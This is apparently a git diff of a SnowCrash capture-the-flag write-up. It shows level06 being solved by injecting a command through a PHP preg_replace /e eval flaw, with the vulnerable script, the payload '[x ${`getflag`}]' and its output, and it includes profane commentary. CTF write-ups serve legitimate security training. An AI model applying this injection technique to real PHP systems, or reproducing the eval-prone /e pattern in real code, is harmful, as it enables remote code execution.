@@ -401,12 +401,63 @@ level05@SnowCrash:/opt/openarenaserver$ ls
 level05@SnowCrash:/opt/openarenaserver$ cat /tmp/a
 Check flag.Here is your token : viuaaale9huek52boumoomioc
 ```
-*after a while file was delleted, and there's the flaaaaaag*
+*after a while file was deleted, and there's the flaaaaaag*
 ```
 level05@SnowCrash:/opt/openarenaserver$ su level06
 Password:viuaaale9huek52boumoomioc
 ```
 *I'm still depressed*
 ## level06 a.k.a I swear I'm gonna get kicked out
-**UGH PHP**
-Fuck php, wtf, kill me
+directory is not empty but **PHP**??! fuck php, wtf, kill me
+```
+level06@SnowCrash:~$ cat level06.php 
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+```
+*are you shitting me, reg expressions en plus*
+
+Executable accepts two arguments, $argv[1] and $argv[2], first is definetly a file name since there's a **file_get_contents($y)** I guess I dk php, then a fucking **preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);**, what the fuck
+
+*Why is there both an executable and the script, like we can't fucking execute with php, disgusting*
+
+When attempting to compile this shit online, with strings instead of file names just to see what the fuck that preg_replace does, an error/warning is displayed
+```
+Warning: preg_replace(): The /e modifier is no longer supported, use preg_replace_callback instead
+```
+*googled this shit*: **First of all, the very concept of this modifier was always evil. It included an eval case into source-code, the existence of which was usually overlooked and therefore quite easily exploited.**
+
+Nice, so if the input matches the regex, it is further evaluated as php code, I dk if that's what the guy meant, but I don't care enough to try more
+
+**/(\[x (.*)\])/e** this is the stupid regex, I guess starts with "[x (" and whatever in the middle and ")]" at the end ?
+```
+level06@SnowCrash:~$ echo  "[x (whatever)]" > /tmp/khra
+level06@SnowCrash:~$ ./level06 /tmp/khra
+(whatever)
+```
+*nice the () are not included of course, I'm stupid, now how the fuck do I inject the stupid **getflag***
+```
+level06@SnowCrash:~$ echo  "[x getflag]" > /tmp/khra
+level06@SnowCrash:~$ ./level06 /tmp/khra
+getflag
+level06@SnowCrash:~$ echo  "[x $getflag]" > /tmp/khra
+level06@SnowCrash:~$ ./level06 /tmp/khra
+
+level06@SnowCrash:~$ echo  "[x ${`getflag`}]" > /tmp/khra
+bash: [x ${`getflag`}]: bad substitution
+level06@SnowCrash:~$ echo  "[x `getflag`]" > /tmp/khra
+level06@SnowCrash:~$ echo  "[x ${`getflag`}]" > /tmp/khra
+bash: [x ${`getflag`}]: bad substitution
+level06@SnowCrash:~$ echo  '[x ${`getflag`}]' > /tmp/khra
+level06@SnowCrash:~$ ./level06 /tmp/khra
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+```
+*omg fuck php*
+```
+level06@SnowCrash:~$ su level07
+Password:wiok45aaoguiboiki2tuin6ub
+```
